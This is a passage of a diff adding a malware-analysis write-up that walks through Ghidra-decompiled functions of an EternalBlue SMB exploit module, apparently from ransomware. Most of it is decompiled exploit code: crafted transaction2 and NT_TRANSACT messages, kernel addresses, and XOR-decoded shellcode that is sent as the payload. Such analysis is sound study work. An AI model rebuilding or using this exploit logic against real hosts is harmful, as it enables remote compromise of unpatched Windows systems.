+      *(undefined4 *)(puVar1 + 0xc) = 0x4b;
+      *(undefined4 *)(puVar1 + 0xe) = 0x3d0;
+      *(undefined4 *)(puVar1 + 0x10) = 0x68;
+      *(undefined *)(puVar1 + 0x12) = 1;
+      *(undefined2 *)((int)puVar1 + 0x29) = 0x3ec;
+      memcpy(puVar1 + 0x16,param_3,0x3ec);
+    }
+  }
+  return puVar1;
+}
+```
+
+This looks like the familiar creation of an SMB payload. We will rename the function to `eternal_create_smb_payload_data`.
+
+### Back to FUN_10002547
+
+Next we see an SMB message being created of type `0xa0` which is `SMB_COM_NT_TRANSACT`. This is also what is returned by the function. We will rename the function to `eternal_create_nt_transact_smb_msg`.
+
+### Back to eternal_blue_main
+
+Back in the root function we see the message that was just created being sent. This is followed by a call to `FUN_10003b5d` nearby.
+
+### FUN_10003b5d (EternalBlue)
+
+```cpp
+undefined4
+FUN_10003b5d(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,undefined4 param_6){
+  LPVOID pvVar1;
+  undefined4 uVar2;
+  int iVar3;
+  short sVar4;
+  LPVOID local_c;
+  int local_8;
+  
+  pvVar1 = allocate_memory(0xf000);
+  if (pvVar1 == (LPVOID)0x0) {
+    uVar2 = 0xffffffff;
+  }
+  else {
+    *(undefined4 *)((int)pvVar1 + 0x807) = 0x3668f383;
+    local_c = pvVar1;
+    memset((void *)((int)pvVar1 + 0x80b),0x54,0xe7f4);
+    local_8 = 0;
+    sVar4 = 0x3d0;
+    do {
+      iVar3 = FUN_10003469(param_1,(short)param_2,(short)param_3,(short)param_4,(short)param_5,
+                           (short)param_6,sVar4,pvVar1,'\0');
+      if (iVar3 != 0) {
+        eternal_free(&local_c);
+        return 0xffffffff;
+      }
+      sVar4 = sVar4 + 0x1000;
+      local_8 = local_8 + 1;
+      pvVar1 = (LPVOID)((int)pvVar1 + 0x1000);
+    } while (local_8 < 0xf);
+    eternal_free(&local_c);
+    uVar2 = FUN_1000369d(param_2,param_3,param_4,param_5,param_6);
+  }
+  return uVar2;
+}
+```
+
+After some memory is created we first see a loop that run `FUN_10003469` up to `0xf` times.
+
+### FUN_10003469 (EternalBlue)
+
+```cpp
+int FUN_10003469(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,undefined2 param_5,undefined2 param_6,undefined2 param_7,void *param_8,char param_9){
+  SIZE_T num_bytes;
+  int iVar1;
+  LPVOID pvVar2;
+  undefined4 *puVar3;
+  void **ppvVar4;
+  undefined4 *puVar5;
+  undefined4 *puVar6;
+  undefined3 in_stack_00000025;
+  undefined local_c;
+  size_t local_8;
+  
+  local_c = 0;
+  local_8 = 0;
+  if (param_8 == (void *)0x0) {
+LAB_10003483:
+    _param_7 = (undefined4 *)0x0;
+  }
+  else {
+    local_8 = 0x1015;
+    _param_7 = (undefined4 *)allocate_memory(0x1015);
+    if (_param_7 == (undefined4 *)0x0) goto LAB_10003483;
+    *(undefined2 *)((undefined *)_param_7 + 3) = 0x1000;
+    *(undefined2 *)((undefined *)_param_7 + 0xb) = 0x1000;
+    *(undefined2 *)((undefined *)_param_7 + 0xd) = 0x35;
+    *(undefined2 *)((undefined *)_param_7 + 0xf) = param_7;
+    *(undefined2 *)((undefined *)_param_7 + 0x11) = 0;
+    *(undefined2 *)((undefined *)_param_7 + 0x13) = 0x1000;
+    *(undefined *)_param_7 = 9;
+    memcpy((undefined *)_param_7 + 0x15,param_8,0x1000);
+  }
+  param_8 = _param_7;
+  if (_param_7 == (undefined4 *)0x0) {
+LAB_100034e1:
+    puVar3 = (undefined4 *)0x0;
+  }
+  else {
+    num_bytes = local_8 + 0x24;
+    local_c = (undefined)num_bytes;
+    puVar5 = (undefined4 *)
+             eternal_create_smb_message
+                       (num_bytes,0x33,0xc007,param_2,param_3,param_4,param_5,param_6);
+    if (puVar5 == (undefined4 *)0x0) {
+      ppvVar4 = &param_8;
+LAB_1000351c:
+      eternal_free(ppvVar4);
+      goto LAB_100034e1;
+    }
+    puVar3 = (undefined4 *)allocate_memory(num_bytes);
+    if (puVar3 == (undefined4 *)0x0) {
+      eternal_free(&param_8);
+      ppvVar4 = (void **)&param_6;
+      goto LAB_1000351c;
+    }
+    iVar1 = 9;
+    puVar6 = puVar3;
+    while (iVar1 != 0) {
+      iVar1 = iVar1 + -1;
+      *puVar6 = *puVar5;
+      puVar5 = puVar5 + 1;
+      puVar6 = puVar6 + 1;
+    }
+    memcpy(puVar3 + 9,_param_7,local_8);
+    eternal_free(&param_8);
+    eternal_free(&param_6);
+  }
+  if (puVar3 == (undefined4 *)0x0) {
+LAB_10003575:
+    iVar1 = -1;
+  }
+  else {
+    _param_7 = puVar3;
+    if (param_9 == '\0') {
+      iVar1 = eternal_send_message((int)puVar3,local_c,param_1);
+    }
+    else {
+      pvVar2 = allocate_memory(0x1000);
+      _param_9 = pvVar2;
+      if (pvVar2 == (LPVOID)0x0) {
+        eternal_free(&param_7);
+        goto LAB_10003575;
+      }
+      param_8 = (void *)0x0;
+      iVar1 = eternal_send_message((int)puVar3,local_c,param_1);
+      if (iVar1 == 0) {
+        iVar1 = eternal_await_response(param_1,1,(char)pvVar2,&param_8);
+        if (iVar1 == 0) {
+          iVar1 = *(int *)((int)pvVar2 + 9);
+          eternal_free(&param_9);
+          goto LAB_100035cf;
+        }
+      }
+      eternal_free(&param_9);
+      iVar1 = -1;
+    }
+LAB_100035cf:
+    eternal_free(&param_7);
+  }
+  return iVar1;
+}
+```
+
+This function appears to first create an SMB payload, then an SMB message of type `0x33` which is `SMB_COM_TRANSACTION2_SECONDARY` and then this message is also sent and the response awaited. We will rename this function to `eternal_send_transaction2_secondary_smb_msg`.
+
+### Back to FUN_10003b5d
+
+After the loop we see a fall to `FUN_1000369d` that also determines the return value of the function.
+
+### FUN_1000369d (EternalBlue)
+
+```cpp
+undefined4 FUN_1000369d(undefined2 param_1,undefined2 param_2,LPVOID param_3,undefined4 param_4,undefined4 *param_5){
+  undefined4 in_EAX;
+  undefined4 uVar1;
+  LPVOID pvVar2;
+  int iVar3;
+  undefined4 local_8;
+  
+  local_8 = 0;
+  param_5 = FUN_10002620(param_1,param_2,(short)param_3,(short)param_4,(short)param_5,
+                         (ushort *)&local_8);
+  if (param_5 == (undefined4 *)0x0) {
+    uVar1 = 0xffffffff;
+  }
+  else {
+    pvVar2 = allocate_memory(0x1000);
+    param_3 = pvVar2;
+    if (pvVar2 == (LPVOID)0x0) {
+      eternal_free(&param_5);
+      uVar1 = 0xffffffff;
+    }
+    else {
+      param_4 = 0;
+      iVar3 = eternal_send_message((int)param_5,(char)local_8,in_EAX);
+      if ((iVar3 == 0) &&
+         (iVar3 = eternal_await_response(in_EAX,1,(char)pvVar2,&param_4), iVar3 == 0)) {
+        uVar1 = *(undefined4 *)((int)pvVar2 + 9);
+      }
+      else {
+        uVar1 = 0xffffffff;
+      }
+      eternal_free(&param_3);
+      eternal_free(&param_5);
+    }
+  }
+  return uVar1;
+}
+```
+
+This function starts off with a call to `FUN_10002620`.
+
+### FUN_10002620 (EternalBlue)
+
+```cpp
+undefined4 * FUN_10002620(undefined2 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,undefined2 param_5,ushort *param_6){
+  ushort *puVar1;
+  undefined4 *puVar2;
+  int iVar3;
+  undefined4 *puVar4;
+  undefined4 *puVar5;
+  undefined4 *puVar6;
+  undefined4 *local_c;
+  undefined4 *local_8;
+  
+  puVar2 = (undefined4 *)allocate_memory(0xc);
+  if (puVar2 != (undefined4 *)0x0) {
+    *puVar2 = DAT_10016014;
+    puVar2[1] = DAT_10016018;
+    *(undefined2 *)(puVar2 + 2) = DAT_1001601c;
+    *(undefined *)((int)puVar2 + 10) = DAT_1001601e;
+    iVar3 = 0xb;
+    puVar4 = puVar2;
+    do {
+      *(byte *)puVar4 = *(byte *)puVar4 ^ 0x2b;
+      puVar4 = (undefined4 *)((int)puVar4 + 1);
+      iVar3 = iVar3 + -1;
+    } while (iVar3 != 0);
+    local_8 = puVar2;
+    puVar4 = (undefined4 *)allocate_memory(0x11);
+    puVar1 = param_6;
+    if (puVar4 == (undefined4 *)0x0) {
+      puVar4 = (undefined4 *)0x0;
+    }
+    else {
+      *(undefined2 *)((int)puVar4 + 1) = 1;
+      *(undefined *)puVar4 = 1;
+      *(undefined2 *)((int)puVar4 + 3) = 0xc;
+      *(undefined4 *)((int)puVar4 + 5) = *puVar2;
+      *(undefined4 *)((int)puVar4 + 9) = puVar2[1];
+      *(undefined4 *)((int)puVar4 + 0xd) = puVar2[2];
+    }
+    local_c = puVar4;
+    if (puVar4 != (undefined4 *)0x0) {
+      *param_6 = 0x35;
+      puVar2 = (undefined4 *)
+               eternal_create_smb_message(0x35,0x2b,0xc007,param_1,param_2,param_3,param_4,param_5);
+      param_6 = (ushort *)puVar2;
+      if (puVar2 != (undefined4 *)0x0) {
+        puVar5 = (undefined4 *)allocate_memory((uint)*puVar1);
+        if (puVar5 == (undefined4 *)0x0) {
+          puVar5 = (undefined4 *)0x0;
+        }
+        else {
+          iVar3 = 9;
+          puVar6 = puVar5;
+          while (iVar3 != 0) {
+            iVar3 = iVar3 + -1;
+            *puVar6 = *puVar2;
+            puVar2 = puVar2 + 1;
+            puVar6 = puVar6 + 1;
+          }
+          puVar5[9] = *puVar4;
+          puVar5[10] = puVar4[1];
+          puVar5[0xb] = puVar4[2];
+          puVar5[0xc] = puVar4[3];
+          *(undefined *)(puVar5 + 0xd) = *(undefined *)(puVar4 + 4);
+        }
+        eternal_free(&local_c);
+        eternal_free(&local_8);
+        eternal_free(&param_6);
+        return puVar5;
+      }
+      eternal_free(&local_c);
+    }
+    eternal_free(&local_8);
+    puVar2 = (undefined4 *)0x0;
+  }
+  return puVar2;
+}
+```
+
+This again looks like the creation of a payload based on globals. This is then followed by the creation of an SMB message of type `0x2b` which is `SMB_COM_ECHO`. This message is also the return value of this function. We will rename this function to `eternal_create_echo_smb_msg`.
+
+### Back to FUN_1000369d
+
+The rest of this function then looks fairly familar and just sends the just created echo message and waits for and returns the response. So we will rename the function to `eternal_send_echo_smb_msg`.
+
+### Back to FUN_10003b5d
+
+Given that we have now finished all the calls within this function we will rename it to `eternal_send_smb_transcation2_secondary_msgs_and_echo_msg`.
+
+### Back to eternal_blue_main
+
+Back in the root function we see a new connection being opened ad another call to `eternal_send_smb_payload_get_response`. If this check returns `0` then we see a massive wall of if statements alternating between connectiosn being opened and `FUN_10003ca0` being invoked.
+
+### FUN_10003ca0 (EternalBlue)
+
+```cpp
+int FUN_10003ca0(undefined4 param_1){
+  char in_AL;
+  byte *pbVar1;
+  int iVar2;
+  uint uVar3;
+  byte *pbVar4;
+  byte *local_c;
+  SIZE_T local_8;
+  
+  local_8 = 0;
+  if (in_AL == '\0') {
+    local_8 = 0x84;
+  }
+  if (in_AL == '\x01') {
+    local_8 = 0xb68;
+  }
+  if (in_AL == '\x02') {
+    local_8 = 0x480;
+  }
+  pbVar1 = (byte *)allocate_memory(local_8);
+  if (pbVar1 == (byte *)0x0) {
+    iVar2 = -1;
+  }
+  else {
+    local_c = pbVar1;
+    if (in_AL == '\0') {
+      *(undefined2 *)(pbVar1 + 2) = 0xf7ff;
+      uVar3 = eternal_ticks_in_64();
+      *(short *)(pbVar1 + 4) = (short)uVar3;
+      uVar3 = eternal_ticks_in_64();
+      *(short *)(pbVar1 + 6) = (short)uVar3;
+    }
+    if (in_AL == '\x01') {
+      pbVar1[8] = 3;
+      pbVar1[0x28] = 3;
+      *(undefined4 *)(pbVar1 + 0xa0) = 0xffd000b0;
+      *(undefined4 *)(pbVar1 + 0xa4) = 0xffffffff;
+      *(undefined4 *)(pbVar1 + 0xa8) = 0xffd000b0;
+      *(undefined4 *)(pbVar1 + 0xac) = 0xffffffff;
+      *(undefined4 *)(pbVar1 + 0xc0) = 0xffdff0c0;
+      *(undefined4 *)(pbVar1 + 0xc4) = 0xffdff0c0;
+      *(undefined4 *)(pbVar1 + 0x18c) = 0xffdff190;
+      *(undefined4 *)(pbVar1 + 0x194) = 0xffdff1f0;
+      *(undefined4 *)(pbVar1 + 0x1d8) = 0xffd001f0;
+      *(undefined4 *)(pbVar1 + 0x1dc) = 0xffffffff;
+      *(undefined4 *)(pbVar1 + 0x1e8) = 0xffd00200;
+      *(undefined4 *)(pbVar1 + 0x1ec) = 0xffffffff;
+      uVar3 = 0;
+      do {
+        pbVar1[uVar3 + 0x1f1] = (&DAT_100123b0)[uVar3] ^ 0xcc;
+        uVar3 = uVar3 + 1;
+      } while (uVar3 < 0x977);
+    }
+    if (in_AL == '\x02') {
+      iVar2 = 0x47b;
+      pbVar4 = pbVar1;
+      do {
+        *pbVar4 = pbVar4[(int)(&DAT_10012d27 + -(int)pbVar1)] ^ 0xcc;
+        pbVar4 = pbVar4 + 1;
+        iVar2 = iVar2 + -1;
+      } while (iVar2 != 0);
+    }
+    iVar2 = eternal_send_message((int)pbVar1,(char)local_8,param_1);
+    eternal_free(&local_c);
+  }
+  return iVar2;
+}
+```
+
+This function again appears to construct a new SMB payload. For this it reads two globals that then get XOR'ed with `0xcc` to get their original value back. After this the message is sent. We will rename this function to `eternal_send_unknown_smb_message`.
+
+### Back to eternal_blue_main
+
+This wall of messages being sent an connections being opened continues for quite a while. And every now and then a different function we've identified also shows up. Finally near the very end we see a function we have not seen yet named `FUN_10003c0a`.
+
+### FUN_10003c0a (EternalBlue)
+
+```cpp
+int FUN_10003c0a(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,undefined4 param_6){
+  LPVOID _Dst;
+  int iVar1;
+  uint uVar2;
+  LPVOID local_8;
+  
+  _Dst = allocate_memory(0x1000);
+  if (_Dst == (LPVOID)0x0) {
+    iVar1 = -1;
+  }
+  else {
+    local_8 = _Dst;
+    memset(_Dst,0x54,0xb8c);
+    uVar2 = 0;
+    do {
+      *(undefined *)((int)_Dst + uVar2 + 0xb8c) = (&DAT_10010b08)[uVar2];
+      uVar2 = uVar2 + 1;
+    } while (uVar2 < 0xaf);
+    memset((void *)((int)_Dst + 0xc3b),0x54,0x3c5);
+    iVar1 = eternal_send_transaction2_secondary_smb_msg
+                      (param_1,(undefined2)param_2,(undefined2)param_3,(undefined2)param_4,
+                       (undefined2)param_5,(undefined2)param_6,0xf3d0,_Dst,'\x01');
+    if (iVar1 == -0x3ffffff3) {
+      iVar1 = 0;
+    }
+    eternal_free(&local_8);
+  }
+  return iVar1;
+}
+```
+
+This function just appears to load some data form a block and then send it as an SMB transaction2 secondary message.
+
+We will rename this function to `eternal_send_stored_transact2_sec_smb_msg`.
+
+### Back to eternal_blue_main
+
+Back in the main fuction we now reached the end of the main block we were in. Going down we mostly see some cleanup. Near the end of the main while loop we see a call to `FUN_10005a46` however.
+
+### FUN_10005a46 (EternalBlue)
+
+```cpp
+undefined4
+FUN_10005a46(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,undefined4 param_6,undefined4 param_7){
+  eternal_send_tree_disconnect_smb_msg(param_2,param_3,param_4,param_5,param_6,param_7);
+  eternal_send_smd_logoff_msg(param_2,param_3,param_4,param_5,param_6,param_7);
+  return param_1;
+}
+```
+
+It appears that this function just performs a proper close of the SMB session. We will rename it `eternal_close_smb_session`.
+
+### Back to eternal_blue_main
+
+At the very end of the function in a smaller while loop we finally see the resource 4 payload we loaded in being passed directly as arguments to a function. Multiple times even. This being to `FUN_10003dd7`.
+
+### FUN_10003dd7 (EternalBlue)
+
+```cpp
+int FUN_10003dd7(undefined4 param_1,undefined2 param_2,undefined2 param_3,undefined2 param_4,undefined2 param_5,short param_6,undefined4 param_7,ushort param_8,void *param_9,undefined4 param_10,int param_11,int *param_12){
+  short sVar1;
+  int iVar2;
+  undefined4 *puVar3;
+  uint uVar4;
+  uint uVar5;
+  undefined4 uStack20;
+  undefined uStack16;
+  SIZE_T local_c;
+  undefined4 *local_8;
+  
+  if (param_9 == (void *)0x0) {
+    iVar2 = -1;
+  }
+  else {
+    local_c = (uint)param_8 + 0xc;
+    puVar3 = (undefined4 *)allocate_memory(local_c);
+    *puVar3 = param_10;
+    iVar2 = *param_12;
+    *(ushort *)(puVar3 + 1) = param_8;
+    puVar3[2] = iVar2;
+    local_8 = puVar3;
+    memcpy(puVar3 + 3,(void *)((int)param_9 + param_11),(uint)param_8);
+    uStack16 = 0;
+    uVar4 = 0;
+    uStack20 = param_7;
+    do {
+      uVar5 = uVar4 & 0x80000003;
+      if ((int)uVar5 < 0) {
+        uVar5 = (uVar5 - 1 | 0xfffffffc) + 1;
+      }
+      *(byte *)(uVar4 + (int)puVar3) =
+           *(byte *)(uVar4 + (int)puVar3) ^ *(byte *)((int)&uStack20 + uVar5);
+      uVar4 = uVar4 + 1;
+    } while ((int)uVar4 < (int)local_c);
+    param_10 = 0;
+    param_9 = (void *)0x0;
+    iVar2 = eternal_send_transaction2_smb_msg
+                      (param_1,param_2,param_3,param_4,param_5,param_6 + 1,0xf2,puVar3,puVar3 + 3,
+                       param_8,param_12,&param_9,(undefined2 *)&param_10);
+    if (iVar2 == -1) {
+      eternal_free(&param_9);
+      eternal_free(&local_8);
+      iVar2 = -1;
+    }
+    else {
+      eternal_free(&local_8);
+      sVar1 = *(short *)((int)param_9 + 0x1a);
+      eternal_free(&param_9);
+      iVar2 = (uint)(sVar1 == 0x11) - 1;
+    }
+  }
+  return iVar2;
+}
+```
+
+Here we then finally see the payload that was loaded being sent using a SMB transaction2 message. We will rename this function to `eternal_send_main_payload`.
+
+### Back to eternal_blue_main
+
+And that was the final call in the EternalBlue explot code. It should be noted that the order might appear was weird because we stepped through the execution in instruction order. However there are a ton of jump instructions that jump to the end of this function which is there the payload is actually being sent.
+
+We will skip the description of returning through all the functions that lead to the `eternal_blue_main` fuction and instead return directly to `Ordinal_1`.
 
 ### Back to Ordinal_1
 
